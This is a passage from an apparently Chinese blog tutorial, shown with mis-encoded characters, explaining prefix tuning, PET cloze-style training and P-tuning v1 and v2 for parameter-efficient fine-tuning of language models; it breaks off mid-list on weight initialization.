<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/057ea6a3ef5d44cfb25e4d167ba03af8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767866884&amp;x-signature=2yvKaaiYbS9IvjnsgyxHBm2Qbjk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<ol>
<li>æ ¸å¿ƒï¼š<strong>åœ¨è¾“å…¥å‰åŠ ä¸€æ®µ â€œä¸“å±è™šæ‹Ÿ tokenâ€ï¼Œåªè®­ç»ƒè¿™æ®µ tokenï¼Œè®©æ¨¡å‹é€‚é…ä»»åŠ¡</strong>ï¼Œå…¨ç¨‹å†»ç»“åŸæ¨¡å‹æƒé‡ï¼Œçœå‚æ•°åˆçµæ´»
<ol>
<li>æ¯”å¦‚ï¼šå†™ä½œæ–‡æ—¶ï¼Œä¸åŒä¸»é¢˜ï¼ˆä»»åŠ¡ï¼‰ç”¨ä¸åŒå¼€å¤´æ¨¡æ¿ï¼ˆæ¯”å¦‚è®®è®ºæ–‡ç”¨ â€œè§‚ç‚¹ + ä¾‹å­â€ å¼€å¤´ï¼Œè®°å™æ–‡ç”¨ â€œåœºæ™¯æå†™â€ å¼€å¤´ï¼‰ï¼Œæ¨¡æ¿å†™å¥½äº†ï¼Œåé¢å†…å®¹è‡ªç„¶è´´åˆä¸»é¢˜ â€”â€” å‰ç¼€è°ƒæ•´å°±æ˜¯ç»™æ¨¡å‹è¾“å…¥åŠ  â€œä¸“å±å¼€å¤´è™šæ‹Ÿ tokenâ€ï¼Œè®©æ¨¡å‹æ ¹æ®è¿™æ®µ token è¾“å‡ºç¬¦åˆä»»åŠ¡çš„ç»“æœã€‚</li>
</ol>
</li>
<li>è°ƒæ•´æ­¥éª¤ï¼š
<ol>
<li>å‡†å¤‡é¢„è®­ç»ƒæ¨¡å‹</li>
<li>åœ¨è¾“å…¥æ–‡æœ¬çš„æœ€å‰é¢ï¼Œæ’å…¥ä¸€æ®µ<strong>å¯è®­ç»ƒçš„è™šæ‹Ÿ token åºåˆ—</strong>ï¼ˆå« Prefixï¼‰ï¼Œæ¯”å¦‚ä»»åŠ¡æ˜¯ â€œå†™è¯·å‡æ¡â€ï¼Œå°±åŠ <code>[è¯·å‡æ¡å¼€å¤´]</code>è¿™æ ·çš„è™šæ‹Ÿ tokenï¼ˆå®é™…æ˜¯å‘é‡ï¼Œä¸æ˜¯æ–‡å­—ï¼‰ã€‚
<ol>
<li>å‰ç¼€é•¿åº¦ï¼šä¸€èˆ¬å– 10-100 ä¸ª tokenï¼ˆè¿œçŸ­äºè¾“å…¥æ–‡æœ¬ï¼‰ï¼›</li>
<li>å…³é”®ï¼šè¿™æ®µ token æ˜¯ â€œç©ºç™½çš„â€ï¼Œéœ€è¦è®­ç»ƒå­¦å‡ºä»»åŠ¡ä¸“å±ä¿¡æ¯ã€‚</li>
<li>å‰ç¼€token ç”Ÿæˆç”¨é«˜æ–¯åˆ†å¸ƒï¼ˆå‡å€¼ 0ã€æ–¹å·®å¾ˆå°ï¼‰è¿›è¡Œåˆå§‹åŒ–ï¼Œé¿å…åˆå§‹å€¼è¿‡å¤§å¹²æ‰°åŸæ¨¡å‹</li>
</ol>
</li>
<li>ç”¨ä»»åŠ¡è®­ç»ƒæ•°æ®ï¼ˆæ¯”å¦‚ â€œè¯·å‡äº‹ç”±â†’è¯·å‡æ¡èŒƒæ–‡â€ï¼‰è®­ç»ƒæ¨¡å‹ï¼Œä½†<strong>åªæ›´æ–°å‰ç¼€ token çš„å‘é‡</strong>ï¼ŒåŸæ¨¡å‹æƒé‡å®Œå…¨ä¸åŠ¨ã€‚
<ol>
<li>è®­ç»ƒæ•°æ®å¿…é¡»æ˜¯ â€œå‰ç¼€ token + ä»»åŠ¡è¾“å…¥ + ä»»åŠ¡è¾“å‡ºâ€ çš„æ ¼å¼ï¼Œå’Œ T5 æ¨¡å‹è®­ç»ƒæ‰€ç”¨çš„æ•°æ®æ ¼å¼æœ‰ç‚¹åƒ(å‰ç¼€+è¾“å…¥)</li>
<li>æ ¸å¿ƒï¼šæ¨¡å‹è¦å­¦ä¹  â€œå‰ç¼€ + è¾“å…¥â€ å’Œ â€œè¾“å‡ºâ€ çš„å¯¹åº”å…³ç³»ï¼Œå‰ç¼€è´Ÿè´£å¼•å¯¼ä»»åŠ¡ç±»å‹ã€‚</li>
</ol>
</li>
<li>è®­ç»ƒåï¼Œå‰ç¼€ token çš„å‘é‡å°± â€œè®°ä½äº†ä»»åŠ¡ä¸“å±è§„åˆ™â€ï¼ˆæ¯”å¦‚å†™è¯·å‡æ¡è¦åŒ…å« â€œè¯·å‡æ—¶é—´ã€äº‹ç”±ã€ç”³è¯·äººâ€ï¼‰ç”¨æ¨¡å‹åšä»»åŠ¡æ—¶ï¼Œåœ¨è¾“å…¥å‰åŠ ä¸Šè®­ç»ƒå¥½çš„å‰ç¼€ tokenï¼Œæ¨¡å‹å°±èƒ½è¾“å‡ºç¬¦åˆä»»åŠ¡çš„ç»“æœ
<ol>
<li>å®é™…ä½¿ç”¨å¯ä»¥æŠŠä¸“é—¨çš„å‰ç¼€ä½¿ç”¨è‡ªåŠ¨åŒ–çš„æ–¹æ³•è¡¨ç¤ºï¼Œæ¯•ç«Ÿä¸å¯èƒ½æ¯æ¬¡ç›´æ¥æ‰‹åŠ¨å†™å‰ç¼€ token</li>
</ol>
</li>
</ol>
</li>
<li>é€‚åˆçš„åœºæ™¯ï¼šé¦–é€‰ â€œç”Ÿæˆç±»å¤šä»»åŠ¡åœºæ™¯â€ï¼Œå…·ä½“åŒ…æ‹¬ï¼š
<ol>
<li>æ–‡æœ¬ç”Ÿæˆï¼šå†™æ–‡æ¡ˆã€å†™é‚®ä»¶ã€æ‘˜è¦ã€ç¿»è¯‘ï¼ˆå¤šè¯­è¨€åˆ‡æ¢ï¼‰ï¼›</li>
<li>ç»“æ„åŒ–ç”Ÿæˆï¼šå†™è¡¨æ ¼ã€å†™ä»£ç ç‰‡æ®µã€ç”Ÿæˆ JSON æ ¼å¼å†…å®¹ï¼›</li>
<li>å¤šä»»åŠ¡æ··åˆï¼šä¸€ä¸ªæ¨¡å‹åŒæ—¶åš â€œå†™è¯·å‡æ¡ + å†™å‘¨æŠ¥ + å†™äº§å“æè¿°â€ ç­‰å¤šä¸ªç”Ÿæˆä»»åŠ¡ã€‚</li>
<li>ä¸é€‚åˆï¼šçº¯åˆ†ç±»ä»»åŠ¡ï¼ˆæ¯”å¦‚æƒ…æ„Ÿåˆ†ç±»ï¼‰ï¼Œæ•ˆæœä¸å¦‚ LoRA/Adapterã€‚</li>
<li>å½“æˆ‘ä»¬é¢å¯¹ä¸€ä¸ªé€šè¿‡APIè®¿é—®çš„ã€æ— æ³•æ”¹åŠ¨å…¶æƒé‡çš„é»‘ç›’æ¨¡å‹æ—¶ï¼Œæç¤ºè°ƒæ•´æ˜¯å”¯ä¸€å¯è¡Œçš„â€œå¾®è°ƒâ€æ‰‹æ®µã€‚å¯ä»¥é€šè¿‡ä¼˜åŒ–è½¯æç¤ºï¼Œæ¥è®©è¯¥æ¨¡å‹æ›´å¥½åœ°é€‚åº”ç‰¹å®šçš„ä»»åŠ¡é£æ ¼æˆ–é¢†åŸŸæœ¯è¯­ã€‚</li>
</ol>
</li>
<li>æ ¸å¿ƒä¼˜åŠ¿ï¼š
<ol>
<li>ä»»åŠ¡åˆ‡æ¢æçµæ´»ï¼šæ¯ä¸ªä»»åŠ¡å¯¹åº”ä¸€å¥—å‰ç¼€ï¼Œæ¢ä»»åŠ¡åªéœ€è¦æ¢å‰ç¼€ï¼Œä¸ç”¨é‡æ–°è®­ç»ƒæ¨¡å‹ï¼Œåƒ â€œæ¢æ¨¡æ¿â€ ä¸€æ ·æ–¹ä¾¿ï¼›</li>
<li>å‚æ•°é‡æè‡´å°‘ï¼šæ¯å¥—å‰ç¼€åªæœ‰å‡ ååˆ°å‡ ç™¾ä¸ª tokenï¼Œå¤šä»»åŠ¡çš„æ€»å‚æ•°é‡ä¹Ÿè¿œä½äº LoRA/Adapterï¼›</li>
<li>åŸæ¨¡å‹èƒ½åŠ›ä¿ç•™å¥½ï¼šå…¨ç¨‹å†»ç»“åŸæ¨¡å‹ï¼Œä¸ä¼šç ´åé€šç”¨ç”Ÿæˆèƒ½åŠ›ï¼Œå¤šä»»åŠ¡ä¹‹é—´å¹²æ‰°å°ã€‚</li>
<li>è®­ç»ƒå‚æ•°é‡ä»…ä¸æç¤ºé•¿åº¦ç›¸å…³ï¼Œæ˜¯æ‰€æœ‰æ–¹æ³•ä¸­æœ€å°‘çš„ï¼ŒåŒæ—¶èƒ½å¼ºå¤§åœ°ä¿å…¨æ¨¡å‹ï¼Œå®Œå…¨é¿å…ç¾éš¾æ€§é—å¿˜ã€‚</li>
</ol>
</li>
<li>è¡¥å……åŸç†ï¼šå®Œå…¨å†»ç»“æ•´ä¸ªé¢„è®­ç»ƒæ¨¡å‹ï¼Œåœ¨è¾“å…¥åºåˆ—çš„åµŒå…¥å‘é‡å‰æ‹¼æ¥ä¸€æ®µå¯è®­ç»ƒçš„"è½¯æç¤º"å‘é‡ï¼Œåœ¨å¾®è°ƒæ—¶åªä¼˜åŒ–è¿™æ®µè½¯æç¤ºå‘é‡ï¼Œä½¿å…¶å­¦ä¼šè§¦å‘æ¨¡å‹å†…éƒ¨ä¸ä»»åŠ¡ç›¸å…³çš„çŸ¥è¯†(åº”è¯¥å°±æ˜¯è¯´ï¼Œæ‹¼æ¥å†…ç½®çš„prompt æ¥å®ç°è°ƒæ•´ï¼Œè€Œä¸æ˜¯å…¶ä»–çš„é‚£ç§å¾®è°ƒ)</li>
</ol>
<h4 data-id="heading-7">5 æç¤ºè°ƒæ•´: prompt/pattern tuning (<strong>PET</strong>ï¼šPattern-Exploiting Training)ï¼ˆ<strong>MASK</strong>ï¼‰ï¼š</h4>
<ol>
<li>
<p>æ ¸å¿ƒæ˜¯æŠŠåˆ†ç±»ç­‰ä»»åŠ¡ â€œåŒ…è£…â€ æˆæ¨¡å‹é¢„è®­ç»ƒæ—¶çš„å®Œå½¢å¡«ç©ºï¼ˆMLMï¼‰ä»»åŠ¡ï¼Œé€šè¿‡æ¨¡æ¿ä¸æ ‡ç­¾è¯æ˜ å°„ï¼Œç”¨å°‘é‡æ ·æœ¬é«˜æ•ˆè®­ç»ƒï¼Œå…¨ç¨‹å†»ç»“åŸæ¨¡å‹ï¼Œåªå¾®è°ƒ MLM å¤´éƒ¨æƒé‡ã€‚</p>
<ol>
<li>å’Œé¢„è®­ç»ƒæ—¶å€™ MLM æ— ç›‘ç£ä¸åŒï¼ŒPET å¿…é¡»æœ‰ç›®æ ‡(æ ‡ç­¾è¯)ï¼Œä¸ç„¶è®­ç»ƒæ–¹å‘å°±æ­ªäº†ï¼Œè¿™æ˜¯æœ‰æ–¹å‘çš„å¾®è°ƒè®­ç»ƒ</li>
</ol>
</li>
<li>
<p>è°ƒæ•´æµç¨‹(ä»¥æƒ…æ„Ÿåˆ†æä¸ºä¾‹)ï¼š</p>
<ol>
<li>è®¾è®¡æ¨¡ç‰ˆï¼šç»™è¾“å…¥åŠ ä¸€å¥å¸¦ <code>[MASK]</code> çš„è‡ªç„¶è¯­è¨€å¼•å¯¼ï¼ŒæŠŠä»»åŠ¡è½¬æˆå®Œå½¢å¡«ç©ºã€‚
<ul>
<li>ä¾‹ï¼šè¾“å…¥ â€œè¿™éƒ¨ç”µå½±è¶…å¥½çœ‹â€ â†’ æ¨¡æ¿åŒ–åï¼šâ€œè¿™éƒ¨ç”µå½±è¶…å¥½çœ‹ã€‚å®ƒæ˜¯ [MASK]ã€‚â€</li>
<li>ä½œç”¨ï¼šå¼•å¯¼æ¨¡å‹åœ¨ <code>[MASK]</code> ä½ç½®é¢„æµ‹ä¸ä»»åŠ¡ç›¸å…³çš„è¯ã€‚</li>
</ul>
</li>
<li>å»ºç«‹æ ‡ç­¾è¯æ˜ å°„ï¼šæŠŠä»»åŠ¡æ ‡ç­¾ï¼ˆå¦‚ â€œæ­£é¢ / è´Ÿé¢â€ï¼‰å¯¹åº”åˆ°å…·ä½“è¯æ±‡ï¼Œä½œä¸º <code>[MASK]</code> çš„ç›®æ ‡è¾“å‡ºã€‚
<ul>
<li>ä¾‹ï¼šæ­£é¢â†’â€œç²¾å½©â€ï¼Œè´Ÿé¢â†’â€œç³Ÿç³•â€ï¼›</li>
<li>æœ¬è´¨ï¼šç”¨æ¨¡å‹ç†Ÿæ‚‰çš„ â€œå¡«è¯â€ ç›®æ ‡æ›¿ä»£é™Œç”Ÿçš„åˆ†ç±»ç›®æ ‡ã€‚</li>
</ul>
</li>
<li>æ„å»ºè®­ç»ƒæ ·æœ¬ï¼šæ‹¼æ¥æˆ â€œè¾“å…¥æ–‡æœ¬ + æ¨¡æ¿â€ æ ¼å¼ï¼Œæ ‡ç­¾æ˜ å°„ä¸ºç›®æ ‡è¯ï¼š
<ul>
<li>è¾“å…¥ï¼š<code>[CLS] è¿™éƒ¨ç”µå½±è¶…å¥½çœ‹ [SEP] å®ƒæ˜¯ [MASK] [SEP]</code></li>
<li>ç›®æ ‡ï¼š<code>[MASK]</code> ä½ç½®é¢„æµ‹ä¸º â€œç²¾å½©â€ï¼ˆå¯¹åº”æ­£é¢æƒ…æ„Ÿï¼‰ã€‚</li>
</ul>
</li>
<li>è®­ç»ƒæ¨¡å‹
<ul>
<li>å†»ç»“åŸæ¨¡å‹ä¸»ä½“ï¼Œåªå¾®è°ƒ MLM é¢„æµ‹å¤´ï¼›</li>
<li>ç”¨äº¤å‰ç†µæŸå¤±ä¼˜åŒ–ï¼Œè®©æ¨¡å‹å­¦ä¼š â€œçœ‹åˆ°è¾“å…¥ + æ¨¡æ¿â†’å¡«å¯¹åº”æ ‡ç­¾è¯â€ã€‚</li>
</ul>
</li>
<li>æ¨ç†é¢„æµ‹
<ul>
<li>è¾“å…¥æ‹¼æ¥æ¨¡æ¿åé€æ¨¡å‹ï¼Œè·å– <code>[MASK]</code> ä½ç½®çš„è¯æ±‡æ¦‚ç‡ï¼›</li>
<li>æŒ‰ Verbalizer æ˜ å°„å›ä»»åŠ¡æ ‡ç­¾ï¼ˆå¦‚ â€œç²¾å½©â€â†’æ­£é¢ï¼‰ã€‚</li>
</ul>
</li>
<li>ç±»æ¯”æµç¨‹ï¼š
<ol>
<li>æ¨¡æ¿å°±æ˜¯é¢˜å¹²ï¼Œæ ‡ç­¾è¯æ˜ å°„å°±æ˜¯å¯¹ç…§çš„å‚è€ƒç­”æ¡ˆï¼Œè®­ç»ƒæ¨¡å‹æ ¹æ®é¢˜å¹²æ‰¾åˆ°å¯¹åº”çš„å‚è€ƒç­”æ¡ˆ</li>
</ol>
</li>
<li>ä½œç”¨ä½ç½®ï¼šMLM å¤´éƒ¨ï¼š
<ol>
<li>MLM å¤´éƒ¨æ˜¯é¢„è®­ç»ƒæ—¶ç”¨äºé¢„æµ‹ [MASK] è¯çš„è¾“å‡ºæ¨¡å—ï¼Œé€šå¸¸ç”± â€œå…¨è¿æ¥å±‚ + è¯è¡¨ Softmaxâ€ ç»„æˆï¼š
<ol>
<li>å¸¸è§„ä¸‹æ¸¸å¾®è°ƒä¼šä¸¢å¼ƒè¯¥å¤´éƒ¨ï¼Œæ–°å¢åˆ†ç±»å±‚ï¼›</li>
<li>PET å¤ç”¨å¹¶å¾®è°ƒæ­¤å¤´éƒ¨ï¼Œè®© [MASK] ä½ç½®è¾“å‡ºä»»åŠ¡æ ‡ç­¾è¯ï¼ˆå¦‚ â€œç²¾å½©â€â†’æ­£é¢æƒ…æ„Ÿï¼‰ï¼Œé€šè¿‡äº¤å‰ç†µæŸå¤±ä¼˜åŒ–ã€‚</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li>
<p>å…³é”®ç‰¹ç‚¹ï¼š</p>
<ul>
<li>
<p><strong>å°æ ·æœ¬(é›¶æ ·æœ¬)å‹å¥½</strong>ï¼šæ¨¡æ¿ + æ˜ å°„è®©æ¨¡å‹å¤ç”¨é¢„è®­ç»ƒçŸ¥è¯†ï¼Œå°‘é‡æ ‡æ³¨å³å¯è§æ•ˆï¼›</p>
</li>
<li>
<p><strong>æ— é¢å¤–å‚æ•°</strong>ï¼šä¸æ–°å¢ç½‘ç»œç»“æ„ï¼Œä»…å¾®è°ƒ MLM å¤´éƒ¨ï¼Œæ˜¾å­˜å ç”¨ä½ï¼›</p>
</li>
<li>
<p><strong>å¯è§£é‡Šæ€§å¼º</strong>ï¼šæ¯”å¦‚ï¼šæ¨ç†æ—¶èƒ½ç›´è§‚çœ‹åˆ°æ¨¡å‹ç»“æœï¼Œä¸åƒå…¶ä»–æ–¹æ³•åªç»™ä¸ªæ ‡ç­¾ï¼Œä¸çŸ¥é“ä¸­é—´é€»è¾‘ã€‚</p>
</li>
<li>
<p><strong>å¯é›†æˆä¼˜åŒ–</strong>ï¼šå¤šä¸ªæ¨¡æ¿åŠ æƒé¢„æµ‹ï¼ˆPattern Ensemblingï¼‰æå‡é²æ£’æ€§ã€‚</p>
</li>
</ul>
</li>
</ol>
<h4 data-id="heading-8">6 P-tuning v1ï¼š</h4>
<ol>
<li>â€œåªè®­æç¤ºã€ä¸åŠ¨æ¨¡å‹â€ çš„é«˜æ•ˆå¾®è°ƒï¼Œæ ¸å¿ƒæ˜¯åœ¨è¾“å…¥å‰åŠ ä¸€ç»„å¯è®­ç»ƒçš„ â€œè™šæ‹Ÿæç¤ºå‘é‡â€ï¼Œç”¨å°å‹æç¤ºç¼–ç å™¨ä¼˜åŒ–ï¼Œå…¨ç¨‹å†»ç»“é¢„è®­ç»ƒå¤§æ¨¡å‹ï¼Œä»¥æä½å‚æ•°é‡é€‚é…åˆ†ç±»ç­‰ä»»åŠ¡</li>
<li>è°ƒæ•´æµç¨‹ï¼š
<ol>
<li>å‡†å¤‡é¢„è®­ç»ƒæ¨¡å‹</li>
<li>æ’è™šæ‹Ÿæç¤º + é…ç¼–ç å™¨
<ol>
<li>æ’å…¥ 5-20 ä¸ª â€œè™šæ‹Ÿæç¤º tokenâ€ï¼ˆæ— å®é™…è¯ä¹‰ï¼Œå°±æ˜¯ä¸€ç»„å¾…ä¼˜åŒ–çš„å‘é‡ï¼‰ï¼Œæ”¾åœ¨è¾“å…¥æœ€å‰é¢ï¼Œæ¯”å¦‚ <code>[P1, P2, P3, P4, P5, è¿™éƒ¨ç”µå½±è¶…å¥½çœ‹]</code>ï¼›</li>
<li>åŠ ä¸€ä¸ª â€œæç¤ºç¼–ç å™¨â€ï¼ˆé€šå¸¸æ˜¯ BiLSTM+MLP çš„å°ç½‘ç»œï¼‰ï¼Œç±»ä¼¼ â€œä¸“é—¨è°ƒæ•™è™šæ‹Ÿæç¤ºçš„å°è€å¸ˆâ€ï¼ŒBiLSTM è´Ÿè´£æ•™å‘é‡æ‡‚åºåˆ—é€»è¾‘ï¼ŒMLP è´Ÿè´£åšæœ€åé€‚é…ã€‚
<ol>
<li>BiLSTMï¼šè™šæ‹Ÿæç¤ºæ˜¯åºåˆ—å‘é‡ï¼ŒLSTM æ“…é•¿å­¦åºåˆ—ä¾èµ–ï¼ŒBiLSTM èƒ½å‰ååŒå‘æ•æ‰æç¤ºå‘é‡é—´çš„å…³è”ï¼Œæ¯”å•çº¯ MLP æ•ˆæœå¥½ï¼›</li>
<li>MLPï¼šåšä¸€æ¬¡éçº¿æ€§å˜æ¢ï¼Œè®©æç¤ºå‘é‡èƒ½æ›´å¥½é€‚é…ä¸‹æ¸¸ä»»åŠ¡ï¼Œç›¸å½“äºç»™ LSTM çš„è¾“å‡ºå†ç²¾è°ƒä¸€ä¸‹ï¼›</li>
</ol>
</li>
</ol>
</li>
<li>å®šä»»åŠ¡æ¨¡æ¿ + æ ‡ç­¾æ˜ å°„
<ol>
<li>æ¨¡æ¿ï¼šæŠŠä»»åŠ¡è½¬æˆå®Œå½¢å¡«ç©ºï¼Œæ¯”å¦‚ <code>[P1,P2,P3,P4,P5] è¿™éƒ¨ç”µå½±æ˜¯[MASK]çš„</code>ï¼›
<ol>
<li>PET æ˜¯ç¦»æ•£æ¨¡æ¿ï¼Œå› ä¸ºéƒ½æ˜¯æ–‡å­—æ¨¡æ¿</li>
<li>P-turning æ˜¯è¿ç»­å‘é‡ï¼Œå› ä¸ºæ˜¯ç¼–ç åçš„ç»“æœ</li>
</ol>
</li>
<li>æ ‡ç­¾æ˜ å°„ï¼šäººå·¥æ ‡ç­¾â†’æ¨¡å‹è¦å¡«çš„è¯ï¼Œæ¯”å¦‚ â€œæ­£é¢â†’ç²¾å½©ï¼Œè´Ÿé¢â†’ç³Ÿç³•â€ã€‚</li>
</ol>
</li>
<li>è¾“å…¥çš„æ‹¼æ¥ä¸ç¼–ç ï¼šæŠŠè™šæ‹Ÿæç¤ºå‘é‡ï¼ˆç»ç¼–ç å™¨ç”Ÿæˆï¼‰å’ŒåŸå§‹æ–‡æœ¬çš„è¯åµŒå…¥æ‹¼åœ¨ä¸€èµ·ï¼Œå½¢æˆæ¨¡å‹èƒ½è®¤çš„è¾“å…¥å‘é‡åºåˆ—ã€‚</li>
<li>æ¨¡å‹æ¨ç†ç®—è¾“å‡ºï¼šæ¨¡å‹æŒ‰æ­£å¸¸æµç¨‹å¤„ç†è¾“å…¥ï¼Œé‡ç‚¹é¢„æµ‹ [MASK] ä½ç½®è¯¥å¡«å•¥ï¼ˆç›®æ ‡æ˜¯ â€œç²¾å½©â€ æˆ– â€œç³Ÿç³•â€ï¼‰ã€‚</li>
<li>è®­ç»ƒï¼š
<ol>
<li>ç”¨äº¤å‰ç†µæŸå¤±ï¼Œæ¯”è¾ƒæ¨¡å‹é¢„æµ‹çš„è¯å’Œäººå·¥æ ‡ç­¾æ˜ å°„çš„è¯ï¼ˆæ¯”å¦‚æ¨¡å‹å¡«äº† â€œä¸€èˆ¬â€ï¼Œå°±å’Œç›®æ ‡ â€œç²¾å½©â€ ç®—å·®è·ï¼‰ã€‚</li>
<li>æŸå¤±åªå›ä¼ ç»™æç¤ºç¼–ç å™¨å’Œè™šæ‹Ÿæç¤ºå‘é‡ï¼Œ<strong>æ¨¡å‹ä¸»ä½“å‚æ•°ä¸€åŠ¨ä¸åŠ¨</strong>â€”â€” ç›¸å½“äº â€œåªç½šå°æ•™ç»ƒï¼Œä¸ç½šå¤§æ¨¡å‹â€ã€‚
<ol>
<li>æœ¬è´¨æ¥è¯´å°±æ˜¯å•ç‹¬è®­ç»ƒæç¤ºç¼–ç å™¨æ¨¡å‹ï¼Œå› ä¸ºé¢„è®­ç»ƒæ¨¡å‹çš„å‚æ•°æ˜¯ä¸åŠ¨çš„ï¼Œé¢„è®­ç»ƒæ¨¡å‹åªæ˜¯ç”¨æ¥æå–ä¿¡æ¯</li>
<li>å¦‚ä½•åªç½šå°æ•™ç»ƒå‘¢ï¼Ÿ<strong>é  â€œç¦æ­¢å¤§æ¨¡å‹å‚æ•°è®¡ç®—æ¢¯åº¦â€ å®ç°æ¢¯åº¦åªä¼ æç¤ºç¼–ç å™¨</strong>ï¼šå®é™…æ“ä½œåªéœ€è¦requires_grad=False å³å¯å®ç°ï¼Œè¿™æ ·å°±å¯ä»¥è®©å¤§æ¨¡å‹å®Œå…¨ä¸å‚ä¸ï¼Œè€Œå°æ¨¡å‹çš„æ¢¯åº¦æ˜¯å¯æ›´æ–°çš„ã€‚</li>
</ol>
</li>
</ol>
</li>
<li>æ¨ç†ï¼š
<ol>
<li>åŠ è½½æç¤º + æ‹¼è¾“å…¥ï¼šæŠŠè®­ç»ƒå¥½çš„è™šæ‹Ÿæç¤ºå‘é‡å’Œç¼–ç å™¨åŠ è½½è¿›æ¥ï¼Œå’Œæ–°æ–‡æœ¬æ‹¼æ¥æˆè¾“å…¥ã€‚
<ol>
<li>ç¼–ç å™¨å°±æ˜¯ä¸Šé¢è®­ç»ƒå¥½çš„æç¤ºç¼–ç å™¨æ¨¡å‹ï¼Œè¿™ä¸ªæ¨¡å‹æ¥æ ¹æ®æ–°æ–‡æœ¬åŠ¨æ€ç”Ÿæˆè™šæ‹Ÿæç¤ºå‘é‡ï¼Œè¿™æ˜¯è¯¥æ–¹æ³•çš„æ ¸å¿ƒ</li>
</ol>
</li>
<li>é¢„æµ‹ + æ˜ å°„å›æ ‡ç­¾ï¼šæ¨¡å‹å¡« [MASK] åï¼ŒæŠŠè¯æ˜ å°„å›äººå·¥æ ‡ç­¾ï¼ˆæ¯”å¦‚ â€œç²¾å½©â€â†’æ­£é¢ï¼‰ï¼Œè¾“å‡ºæœ€ç»ˆç»“æœã€‚</li>
</ol>
</li>
<li>ä¸ PET å’Œå‰ç¼€æç¤ºçš„å…³ç³»ï¼š
<ol>
<li>ç»§æ‰¿ PET çš„æ ¸å¿ƒï¼šæŠŠä¸‹æ¸¸ä»»åŠ¡ï¼ˆæ¯”å¦‚åˆ†ç±»ï¼‰è½¬æˆ<strong>å®Œå½¢å¡«ç©ºï¼ˆMLMï¼‰ä»»åŠ¡</strong>ï¼Œé  [MASK] é¢„æµ‹ + æ ‡ç­¾è¯æ˜ å°„å‡ºç»“æœï¼Œå¤ç”¨æ¨¡å‹é¢„è®­ç»ƒçŸ¥è¯†ï¼Œå°æ ·æœ¬æ•ˆæœå¥½ï¼›</li>
<li>ç»§æ‰¿å‰ç¼€è°ƒæ•´çš„æ ¸å¿ƒï¼šç”¨<strong>å¯è®­ç»ƒçš„è™šæ‹Ÿæç¤ºå‘é‡</strong>ï¼ˆä¸æ˜¯ PET çš„ç¦»æ•£æ–‡å­—æ¨¡æ¿ï¼‰ï¼Œæ”¾åœ¨è¾“å…¥æœ€å‰é¢å¼•å¯¼ä»»åŠ¡ï¼Œå‚æ•°é‡æå°‘ï¼›</li>
<li>é€šä¿—è¯´ï¼šP-tuning v1 = PET çš„ â€œå®Œå½¢å¡«ç©ºè§£é¢˜æ€è·¯â€ + å‰ç¼€è°ƒæ•´çš„ â€œè™šæ‹Ÿå‰ç¼€å¼•å¯¼â€ï¼Œå–ä¸¤è€…ä¹‹é•¿ï¼Œè¡¥ä¸¤è€…ä¹‹çŸ­ã€‚</li>
</ol>
</li>
</ol>
</li>
</ol>
<h4 data-id="heading-9">7 P-tuning v2:</h4>
<ol>
<li>æ ¸å¿ƒå°±æ˜¯ï¼š<strong>å†»ç»“é¢„è®­ç»ƒå¤§æ¨¡å‹ï¼Œåœ¨ Transformer æ¯ä¸€å±‚éƒ½æ’å…¥å¯å­¦ä¹ çš„è™šæ‹Ÿæç¤ºå‘é‡ï¼ˆå‰ç¼€ï¼‰ï¼Œå¹¶è®­è¿™äº›å°å‚æ•°</strong>ï¼Œæ•ˆæœè¿½å¹³å…¨é‡å¾®è°ƒä½†æˆæœ¬æä½</li>
<li>å…³é”®ï¼šå’Œ v1 æ¯”ï¼Œv2 å»æ‰äº† BiLSTM/MLP ç¼–ç å™¨ï¼Œç›´æ¥åœ¨æ¯å±‚æ’æç¤ºï¼Œæ•ˆæœæ›´ç›´æ¥ã€è®­ç»ƒæ›´ç®€å•</li>
<li>è°ƒæ•´æµç¨‹(ä»¥æƒ…æ„Ÿåˆ†ç±»ä¸ºä¾‹)ï¼š
<ol>
<li>å‡†å¤‡é¢„è®­ç»ƒæ¨¡å‹</li>
<li>æ’å…¥è™šæ‹Ÿæç¤ºï¼šåœ¨ Transformer æ¯ä¸€å±‚çš„ Self-Attention é‡Œï¼Œç»™ Key å’Œ Value éƒ½åŠ ä¸€ç»„ â€œè™šæ‹Ÿå‰ç¼€å‘é‡â€ï¼ˆKpã€Vpï¼‰ï¼Œè¿™äº›æ˜¯å”¯ä¸€è¦è®­çš„å‚æ•°ï¼ˆçº¦å æ¨¡å‹ 0.1%-3%ï¼‰ã€‚
<ol>
<li>è™šæ‹Ÿå‰ç¼€å‘é‡é•¿åº¦ä¸€èˆ¬åœ¨ 10-20 token ä¹‹é—´ï¼Œæ¯å±‚çš„è‡ªæ³¨æ„åŠ›ä¸­è™šæ‹Ÿå‰ç¼€å‘é‡é•¿åº¦ç›¸åŒ</li>
<li><strong>å…³äºåœ¨æ¡†æ¶ä¸­å¦‚ä½•å®ç° Q/K/V çš„è‡ªåŠ¨åŒ–åˆ’åˆ†</strong>ï¼š
<ol>
<li>é¦–å…ˆè¾“å…¥åªæœ‰ä¸€ä»½ï¼Œä½†æ˜¯ QKV å¯¹åº”çš„æƒé‡å‚æ•°çŸ©é˜µå¹¶ä¸ä¸€æ ·ï¼Œä»è€Œè®©è¾“å…¥çš„æ•°æ®å‘ QKV ä¸‰ä¸ªæ–¹å‘ç”Ÿæˆ</li>
<li>è¿™æ ·ç”Ÿæˆåçš„ QKV æ‰èƒ½ç”Ÿæˆæ³¨æ„åŠ›è®¡ç®—çš„å€¼</li>
<li>å¦‚ä½•åˆå§‹åŒ–å‚æ•°çŸ©é˜µå‘¢ï¼Ÿ
<ol>
<li>å€¼å¤ªå¤§ï¼šè¾“å…¥ç»è¿‡çº¿æ€§å˜æ¢åä¼šå˜æˆè¶…å¤§æ•°ï¼Œæ¿€æ´»åå…¨æ˜¯ 1/0ï¼Œæ¢¯åº¦ç›´æ¥æ¶ˆå¤±ï¼›</li>
<li>å€¼å¤ªå°ï¼šè¾“å…¥å˜æ¢åå…¨æ˜¯æ¥è¿‘ 0 çš„æ•°ï¼Œæ¢¯åº¦ä¹Ÿä¼ ä¸ä¸‹å»ï¼›</li>
</ol>
</li>
<li>åˆå§‹åŒ–æ–¹æ³•ï¼š
<ol>
